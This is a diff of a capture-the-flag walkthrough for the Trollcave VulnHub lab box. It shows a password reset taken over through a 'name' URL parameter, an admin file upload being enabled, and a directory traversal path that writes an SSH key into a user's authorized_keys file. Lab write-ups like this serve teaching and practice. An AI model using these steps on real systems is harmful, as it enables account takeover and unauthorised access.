@@ -133,14 +133,14 @@ t password reset. busy with this at the moment, but having trouble with site ema
 of this.\n\nso far i've implemented a `password_resets` resource in rails and it's about 90% working except for the email thing. it's very frustrating. if anyone has 
 any suggestions about how to get the email working, please drop me a pm\n\n--coderguy\n\t\t","user_id":4,"created_at":"2017-10-23T09:39:43.057Z","updated_at":"2017-10-23T09:39:43.057Z"}{"id":7,"title":"Welcome to the TrollCave!","content":"\nThe Trollcave is a community blogging website for people with a sense of humour. As long as you're not an idiot, we're very friendly. Registration is free, so [what are you waiting for](/register)?\n\t\t","user_id":1,"created_at":"2017-10-23T09:39:43.103Z","updated_at":"2017-10-23T09:39:43.103Z"}<html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html><html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html><html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html>{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}
 ```
-Remember when reading about: 
+When reading the blog we come across a user talking about password_resets: 
 
 ```
 so far i've implemented a `password_resets` resource in rails and it's about 90% working except for the email thing. it's very frustrating
 ```
 ![5-4.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-4.png)
 
-It alludes to using this to reset password.
+Google search tells us to reset the password we use:
 http://192.168.251.9/password_resets/new
 
 ![5-5.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-5.png)
@@ -149,23 +149,22 @@ It sends the link
 
 
 
-Note the end of the string has the name parameter. We'll abuse this part.
-We already know all the users. How about resetting password for King `http://192.168.251.9/password_resets/edit.9AY5mR6eT1CmgWazJRsdvw?name=King`
+Note the end of the string has the parameter [name]. We'll abuse this part.
+Since we already know all the users. How about resetting password for King `http://192.168.251.9/password_resets/edit.9AY5mR6eT1CmgWazJRsdvw?name=King`
 
 
 
 
-Go to admin panel and enable file upload 
+Once we're logged in we go to admin panel and enable file upload 
 
 
 
-Reading through through the users blogs we come across
+Reading through the user King blogs we come across
 
 
-This tells us we've got a user called `rails` and we've also enabled file upload which was previpusly disabled.
-Attempting to u plad and execute ruby shell proves unfruitful.
+This tells us we've got a user called `rails`. Attempting to upload and execute reverse shell (php or ruby) proves unfruitful.
 
-We know we already running ssh. We shall then upload a ssh key using directory traversal into the home directory of 
+But not all hope is lost the box is running ssh. How about uploadindg a ssh key we control via directory traversal into the home directory of rails.
 
 ../../../../../../../../home/rails/.ssh/authorized_keys
 
@@ -198,7 +197,7 @@ drwxrwxr-x 2 king king 4.0K Sep 28  2017 calc
 -rw-r--r-- 1 king king    0 Sep 16  2016 .sudo_as_admin_successful
 
 He's running a program called 
-
+```
 drwxrwxr-x 2 king king 4.0K Sep 28  2017 calc
 
 rails@trollcave:/home/king/calc$ cat calc.js
@@ -291,7 +290,7 @@ function display_404(pathname, request, response)
 // Start the server and route the requests
 start(route);
 rails@trollcave:/home/king/calc$
-
+```
 http.createServer(onRequest).listen(8888, '127.0.0.1');
 console.log("Server started"); 
 
